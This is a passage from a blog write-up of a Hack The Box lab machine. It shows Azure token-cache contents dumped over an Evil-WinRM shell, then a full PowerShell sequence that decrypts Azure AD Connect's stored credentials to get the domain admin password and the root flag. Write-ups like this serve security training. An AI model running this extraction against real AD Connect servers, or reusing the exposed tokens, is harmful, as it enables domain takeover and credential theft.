        &quot;GalleryUrl&quot;: &quot;https://gallery.azure.com/&quot;,
        &quot;GraphUrl&quot;: &quot;https://graph.windows.net/&quot;,
        &quot;ActiveDirectoryServiceEndpointResourceId&quot;: &quot;https://management.core.windows.net/&quot;,
        &quot;StorageEndpointSuffix&quot;: &quot;core.windows.net&quot;,
        &quot;SqlDatabaseDnsSuffix&quot;: &quot;.database.windows.net&quot;,
        &quot;TrafficManagerDnsSuffix&quot;: &quot;trafficmanager.net&quot;,
        &quot;AzureKeyVaultDnsSuffix&quot;: &quot;vault.azure.net&quot;,
        &quot;AzureKeyVaultServiceEndpointResourceId&quot;: &quot;https://vault.azure.net&quot;,
        &quot;GraphEndpointResourceId&quot;: &quot;https://graph.windows.net/&quot;,
        &quot;DataLakeEndpointResourceId&quot;: &quot;https://datalake.azure.net/&quot;,
        &quot;BatchEndpointResourceId&quot;: &quot;https://batch.core.windows.net/&quot;,
        &quot;AzureDataLakeAnalyticsCatalogAndJobEndpointSuffix&quot;: &quot;azuredatalakeanalytics.net&quot;,
        &quot;AzureDataLakeStoreFileSystemEndpointSuffix&quot;: &quot;azuredatalakestore.net&quot;,
        &quot;AdTenant&quot;: &quot;Common&quot;,
        &quot;VersionProfiles&quot;: [],
        &quot;ExtendedProperties&quot;: {
          &quot;OperationalInsightsEndpoint&quot;: &quot;https://api.loganalytics.io/v1&quot;,
          &quot;OperationalInsightsEndpointResourceId&quot;: &quot;https://api.loganalytics.io&quot;,
          &quot;AzureAnalysisServicesEndpointSuffix&quot;: &quot;asazure.windows.net&quot;,
          &quot;AnalysisServicesEndpointResourceId&quot;: &quot;https://region.asazure.windows.net&quot;,
          &quot;AzureAttestationServiceEndpointSuffix&quot;: &quot;attest.azure.net&quot;,
          &quot;AzureAttestationServiceEndpointResourceId&quot;: &quot;https://attest.azure.net&quot;
        }
      },
      &quot;VersionProfile&quot;: null,
      &quot;TokenCache&quot;: {
        &quot;CacheData&quot;: null
      },
      &quot;ExtendedProperties&quot;: {}
    }
  },
  &quot;ExtendedProperties&quot;: {}
}
*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; cat AzureRmContextSettings.json
{&quot;Mode&quot;:&quot;CurrentUser&quot;,&quot;ContextDirectory&quot;:&quot;C:\\Users\\mhope\\.Azure&quot;,&quot;ContextFile&quot;:&quot;AzureRmContext.json&quot;,&quot;CacheDirectory&quot;:&quot;C:\\Users\\mhope\\.Azure&quot;,&quot;CacheFile&quot;:&quot;TokenCache.dat&quot;,&quot;Settings&quot;:{}}
*Evil-WinRM* PS C:\Users\mhope\.Azure&gt; cat TokenCache.dat
‡https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://graph.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0©{&quot;RefreshToken&quot;:&quot;AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA&quot;,&quot;ResourceInResponse&quot;:&quot;https:\/\/graph.windows.net\/&quot;,&quot;Result&quot;:{&quot;AccessToken&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLndpbmRvd3MubmV0LyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OC8iLCJpYXQiOjE1NzgwNTgyNzYsIm5iZiI6MTU3ODA1ODI3NiwiZXhwIjoxNTc4MDYyMTc2LCJhY3IiOiIxIiwiYWlvIjoiNDJWZ1lBZ3NZc3BPYkdtYjU4V3ZsK0d3dzhiYXA4bnhoOWlSOEpVQit4OWQ5L0g2MEFBQSIsImFtciI6WyJwd2QiXSwiYXBwaWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJhcHBpZGFjciI6IjAiLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoiNjJlOTAzOTQtNjlmNS00MjM3LTkxOTAtMDEyMTc3MTQ1ZTEwIiwic3ViIjoiVWFTMGI5ZHJsMmlmYzlvSXZjcUFlbzRoY3c1YWpyV3g3bU5DMklrMkRsayIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJFVSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJsM2xBR3NBRVYwcVdQelJ1Vkh4U0FBIiwidmVyIjoiMS4wIn0.czHUwYjleGp2C1c_BMZIZkEHz-12R86qmngaiyTeTW_bM659hqetbQylvf_qCJDuxD8e28H6Oqw5Hn1Hwij7yHK-kOjUeUlXkGyzFhQbDf3CQLvFsZioUiHHiighrVjZfu6Rolv8fxoG3Q8cXS-Ms_Wm6RI-zcaK9Eyu841D51jzvYI60rC9HTummktfVURP2xf3DnskqjJF1dDlSi62gPGXGk0xZordZFiGoYAtv8qiMAiSCioN_sw_xWRJ250nvw90biQ1NkPRpSGf8jNpbYktB0Ti8-sNblaGRJBQqmHxZ-0PkSq31op2CzHN7wwYCJOEoJpOtS-x4j1DGZ19hA&quot;,&quot;AccessTokenType&quot;:&quot;Bearer&quot;,&quot;ExpiresOn&quot;:{&quot;DateTime&quot;:&quot;\/Date(1578062173584)\/&quot;,&quot;OffsetMinutes&quot;:0},&quot;ExtendedExpiresOn&quot;:{&quot;DateTime&quot;:&quot;\/Date(1578062173584)\/&quot;,&quot;OffsetMinutes&quot;:0},&quot;ExtendedLifeTimeToken&quot;:false,&quot;IdToken&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4Mjc2LCJuYmYiOjE1NzgwNTgyNzYsImV4cCI6MTU3ODA2MjE3NiwiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.&quot;,&quot;TenantId&quot;:&quot;372efea9-7bc4-4b76-8839-984b45edfb98&quot;,&quot;UserInfo&quot;:{&quot;DisplayableId&quot;:&quot;john@a67632354763outlook.onmicrosoft.com&quot;,&quot;FamilyName&quot;:&quot;Clark&quot;,&quot;GivenName&quot;:&quot;John&quot;,&quot;IdentityProvider&quot;:&quot;https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/&quot;,&quot;PasswordChangeUrl&quot;:null,&quot;PasswordExpiresOn&quot;:null,&quot;UniqueId&quot;:&quot;e4f56bc1-021f-4795-bca2-bedfc819e90a&quot;}},&quot;UserAssertionHash&quot;:null}‘https://login.windows.net/372efea9-7bc4-4b76-8839-984b45edfb98/:::https://management.core.windows.net/:::1950a258-227b-4e31-a9cf-717495945fc2:::0‡{&quot;RefreshToken&quot;:&quot;AQABAAAAAACQN9QBRU3jT6bcBQLZNUj7aeQ8R2hfsMQE-DIEEp8rOWPiom2rNwROtUThYh6cCyfB9McL8XdHR94VQSY3KAN-SWuINLqSnI_Lfj-vM1nsCu_Kh51XTceMlWr9mZsNYiX5oCnIBT50bCWIlyeZxmpR7L4sfRp_2iESLU06U0QiHBP7L_HR75crAfpQdJ2oJEn9MWYoxFKIHxXRgAp8fwyKa5yVo5usuanLFGofYzvU6YUGwSFwHskyy_iHdmimggyI7pxp2-C0pSlRp6yZp-4JYyvoeTjxqtXkpMR7VnmJ5qIqJvecNcutXPu-SJDWRvvmW_V2se4V1u1ecuJDe02oAmouL7yp8HrcOBNgn9Jg_f27tHJSbONR-rFWFmeYr-Zi84EJbubYBb7DdzZaoCArbYrgglrAOmz85N9-DMbIJdT7ffteT0hu2rHI6OVDvgckNv-XVhwMF55XtjxxxhpR1EljIq07qCPCqSVoNnoyhDawgyYiNRh0EVr1kf6GEA9bAYNMHgf3VN5WApXbb0VzoxozBKNkNiMybB-uA1d9DLs1eOimxrhoKjsK6cyKTsslGe8qgjcLS0pcRDVvNub1_fKQAXqVB4WZXMo_TDSALh-ctiwVVFNRqTeGsdzcfJe7j3WwzuIiuWfIYydSQKaeRo87qtg6v4dHy4hVBOwm-NPah29sOrSNsyuUydhkNK2QXCwn_hV5-7OCwfSJHG9Dja4r8B_iS0-VvcwzRUT_-2t1eNN8vgRgTlgAdotG330U9SshDgVjg27VHIw-e-57ID7FTEjnVfc4loRNjoNJlSAA&quot;,&quot;ResourceInResponse&quot;:&quot;https:\/\/management.core.windows.net\/&quot;,&quot;Result&quot;:{&quot;AccessToken&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSIsImtpZCI6InBpVmxsb1FEU01LeGgxbTJ5Z3FHU1ZkZ0ZwQSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuY29yZS53aW5kb3dzLm5ldC8iLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYWNyIjoiMSIsImFpbyI6IjQyVmdZSGc3ajlGN3oxK24renhKZktXQmpxcWRYMzFEVDNLc2ovL2FzT1d5VFcycTNRSUEiLCJhbXIiOlsicHdkIl0sImFwcGlkIjoiMTk1MGEyNTgtMjI3Yi00ZTMxLWE5Y2YtNzE3NDk1OTQ1ZmMyIiwiYXBwaWRhY3IiOiIwIiwiZmFtaWx5X25hbWUiOiJDbGFyayIsImdpdmVuX25hbWUiOiJKb2huIiwiZ3JvdXBzIjpbImM3OTRlNzE3LTIxZWYtNDljZS1hZjAwLTljMDEwZGM0MWE3NiJdLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInB1aWQiOiIxMDAzMjAwMDkzOTYzMDJCIiwic2NwIjoidXNlcl9pbXBlcnNvbmF0aW9uIiwic3ViIjoid1U4Y1RtUm5tTzM2Z1E5MEx4VUNiN0tGMXZ3NlVUVlVKa1VPNThJd3NVTSIsInRpZCI6IjM3MmVmZWE5LTdiYzQtNGI3Ni04ODM5LTk4NGI0NWVkZmI5OCIsInVuaXF1ZV9uYW1lIjoiam9obkBhNjc2MzIzNTQ3NjNvdXRsb29rLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiI4MjNlVzFyWmZFQ1hEV2lHaHQ1UkFBIiwidmVyIjoiMS4wIiwid2lkcyI6WyI2MmU5MDM5NC02OWY1LTQyMzctOTE5MC0wMTIxNzcxNDVlMTAiXX0.ja68GQ9Suvm8-6a732DZy7Z7Q62XnmL0hsVnMKP3L-u7KB9W8nafebCzEmwhAoAzEqVOKfApM8VjOALGJcgz60sYbN0JtK4RaHCiF0yQogGTvgFe3FMB-26wCxGo-d_hTxiPiFUGfTuqSMzprXfBEKLneXNKcLlkav2pPNAhLD_HoshDaznMPlt2W00rq6hJII032WoZQMPYMLJmnub4pi2N3ScroWO3zDQ16wpoFCOSYbuqoLKSm-FLN8yEhTJDf2umcOaLVE7jtnHba_rEPyC_sBtIedl1nSR8kr7A9B8dBvn0pC3M7gYIVpVwIana6pni6I8jaMwH_-3aJmCLhw&quot;,&quot;AccessTokenType&quot;:&quot;Bearer&quot;,&quot;ExpiresOn&quot;:{&quot;DateTime&quot;:&quot;\/Date(1578062154521)\/&quot;,&quot;OffsetMinutes&quot;:0},&quot;ExtendedExpiresOn&quot;:{&quot;DateTime&quot;:&quot;\/Date(1578062154521)\/&quot;,&quot;OffsetMinutes&quot;:0},&quot;ExtendedLifeTimeToken&quot;:false,&quot;IdToken&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJhdWQiOiIxOTUwYTI1OC0yMjdiLTRlMzEtYTljZi03MTc0OTU5NDVmYzIiLCJpc3MiOiJodHRwczovL3N0cy53aW5kb3dzLm5ldC8zNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgvIiwiaWF0IjoxNTc4MDU4MjU3LCJuYmYiOjE1NzgwNTgyNTcsImV4cCI6MTU3ODA2MjE1NywiYW1yIjpbInB3ZCJdLCJmYW1pbHlfbmFtZSI6IkNsYXJrIiwiZ2l2ZW5fbmFtZSI6IkpvaG4iLCJpcGFkZHIiOiI0Ni40LjIyMy4xNzMiLCJuYW1lIjoiSm9obiIsIm9pZCI6ImU0ZjU2YmMxLTAyMWYtNDc5NS1iY2EyLWJlZGZjODE5ZTkwYSIsInN1YiI6Inl2V2x2eEFSbE84V0pKN0dUUmFYb0p0MHAwelBiUkRIX0EtcC1FTEtFdDgiLCJ0aWQiOiIzNzJlZmVhOS03YmM0LTRiNzYtODgzOS05ODRiNDVlZGZiOTgiLCJ1bmlxdWVfbmFtZSI6ImpvaG5AYTY3NjMyMzU0NzYzb3V0bG9vay5vbm1pY3Jvc29mdC5jb20iLCJ1cG4iOiJqb2huQGE2NzYzMjM1NDc2M291dGxvb2sub25taWNyb3NvZnQuY29tIiwidmVyIjoiMS4wIn0.&quot;,&quot;TenantId&quot;:&quot;372efea9-7bc4-4b76-8839-984b45edfb98&quot;,&quot;UserInfo&quot;:{&quot;DisplayableId&quot;:&quot;john@a67632354763outlook.onmicrosoft.com&quot;,&quot;FamilyName&quot;:&quot;Clark&quot;,&quot;GivenName&quot;:&quot;John&quot;,&quot;IdentityProvider&quot;:&quot;https:\/\/sts.windows.net\/372efea9-7bc4-4b76-8839-984b45edfb98\/&quot;,&quot;PasswordChangeUrl&quot;:null,&quot;PasswordExpiresOn&quot;:null,&quot;UniqueId&quot;:&quot;e4f56bc1-021f-4795-bca2-bedfc819e90a&quot;}},&quot;UserAssertionHash&quot;:null}
</code></pre></div>

<h2>Password Hash Synchronisation</h2>
<p>A few goolge search lead us to this article about
<a href="https://blog.xpnsec.com/azuread-connect-for-redteam/">Azure AD Connect for Red Teamers</a>.</p>
<p>We try the POC in the article on our box but the first line seems wrong as we
get an error when we try to connect to the local DB. The trick is to use
<code>trusted_connection</code> and to have the <code>Data source</code> set to <code>.</code>.</p>
<p>Then we easily retrive the administrator password.</p>
<div class="highlight"><pre><span></span><code>*Evil-WinRM* PS C:&gt; $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList &quot;Data Source=.;Initial Catalog=ADSync;trusted_connection=true;&quot;
*Evil-WinRM* PS C:&gt; $client.Open()
*Evil-WinRM* PS C:&gt; $cmd = $client.CreateCommand()
*Evil-WinRM* PS C:&gt; $cmd.CommandText = &quot;SELECT keyset_id, instance_id, entropy FROM mms_server_configuration&quot;
*Evil-WinRM* PS C:&gt; $reader = $cmd.ExecuteReader()
*Evil-WinRM* PS C:&gt; $reader.Read() | Out-Null
*Evil-WinRM* PS C:&gt; $key_id = $reader.GetInt32(0)
*Evil-WinRM* PS C:&gt; $instance_id = $reader.GetGuid(1)
*Evil-WinRM* PS C:&gt; $entropy = $reader.GetGuid(2)
*Evil-WinRM* PS C:&gt; $reader.Close()
*Evil-WinRM* PS C:&gt; $cmd = $client.CreateCommand()
*Evil-WinRM* PS C:&gt; $cmd.CommandText = &quot;SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = &#39;AD&#39;&quot;
*Evil-WinRM* PS C:&gt; $reader = $cmd.ExecuteReader()
*Evil-WinRM* PS C:&gt; $reader.Read() | Out-Null
*Evil-WinRM* PS C:&gt; $config = $reader.GetString(0)
*Evil-WinRM* PS C:&gt; $crypted = $reader.GetString(1)
*Evil-WinRM* PS C:&gt; $reader.Close()
*Evil-WinRM* PS C:&gt; add-type -path &#39;C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll’
*Evil-WinRM* PS C:&gt; $km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
*Evil-WinRM* PS C:&gt; $km.LoadKeySet($entropy, $instance_id, $key_id)
*Evil-WinRM* PS C:&gt; $key = $null
*Evil-WinRM* PS C:&gt; $km.GetActiveCredentialKey([ref]$key)
*Evil-WinRM* PS C:&gt; $key2 = $null
*Evil-WinRM* PS C:&gt; $km.GetKey(1, [ref]$key2)
*Evil-WinRM* PS C:&gt; $decrypted = $null
*Evil-WinRM* PS C:&gt; $key2.DecryptBase64ToString($crypted, [ref]$decrypted)
*Evil-WinRM* PS C:&gt; $domain = select-xml -Content $config -XPath &quot;//parameter[@name=&#39;forest-login-domain&#39;]&quot; | select @{Name = &#39;Domain&#39;; Expression = {$_.node.InnerXML}}
*Evil-WinRM* PS C:&gt; $username = select-xml -Content $config -XPath &quot;//parameter[@name=&#39;forest-login-user&#39;]&quot; | select @{Name = &#39;Username&#39;; Expression = {$_.node.InnerXML}}
*Evil-WinRM* PS C:&gt; $password = select-xml -Content $decrypted -XPath &quot;//attribute&quot; | select @{Name = &#39;Password&#39;; Expression = {$_.node.InnerXML}}
*Evil-WinRM* PS C:&gt; Write-Host (&quot;Domain: &quot; + $domain.Domain)
Domain: MEGABANK.LOCAL
*Evil-WinRM* PS C:&gt; Write-Host (&quot;Username: &quot; + $username.Username)
Username: administrator
*Evil-WinRM* PS C:&gt; Write-Host (&quot;Password: &quot; + $password.Password)
Password: d0m@in4dminyeah!
</code></pre></div>

<p>We connect to the box with the domain admin account and retrieve the root flag.</p>
<div class="highlight"><pre><span></span><code>root@kalili:~/tools/github/evil-winrm# ruby evil-winrm.rb -u administrator -i 10.10.10.172 -p &#39;d0m@in4dminyeah!&#39;

Evil-WinRM shell v1.8

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cat ../Desktop/root.txt
12909612d25c8dcf6e5a07d1a804a0bc
</code></pre></div>

<h1>Wrapping up</h1>
<p>The user part of the box was classical and quit easy. The root part allow me to
learn a few things about Azure, Azure AD and how the Password Hash
Synchronisation works.</p>
  </div>
  <div class="tag-cloud">
    <p>
      <a href="../../tag/security.html">security</a>
      <a href="../../tag/boot2root.html">boot2root</a>
      <a href="../../tag/htb.html">HTB</a>
      <a href="../../tag/windows.html">Windows</a>
      <a href="../../tag/smb.html">SMB</a>
      <a href="../../tag/azure.html">Azure</a>
      <a href="../../tag/phs.html">PHS</a>
    </p>
  </div>


  <div class="neighbors">
    <a class="btn float-left" href="../../2020/06/htb-nest.html" title="HTB: Nest">
      <i class="fa fa-angle-left"></i> Previous Post
    </a>
    <a class="btn float-right" href="../../2020/06/htb-servmon.html" title="HTB: ServMon">
      Next Post <i class="fa fa-angle-right"></i>
    </a>
  </div>



</article>

    <footer>
<p>
  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
</p>
<p>
Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
  <span class="footer-separator">|</span>
  Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
  <script id="dark-theme-script"
          src="../../theme/dark-theme/dark-theme.min.js"
          data-enable-auto-detect-theme="True"
          data-default-theme="light"
          type="text/javascript">
  </script>
</p><p>
  <a rel="license"
     href="http://creativecommons.org/licenses/by/4.0/"
     target="_blank">
    <img alt="Creative Commons License"
         title="Creative Commons License"
         style="border-width:0"
           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
         width="80"
         height="15"/>
  </a>
</p>    </footer>
  </main>




<script type="application/ld+json">
{
  "@context" : "http://schema.org",
  "@type" : "Blog",
  "name": " maggick's logs ",
  "url" : "../..",
  "image": "https://maggick.fr/media/image.png",
  "description": ""
}
</script>

</body>
</html>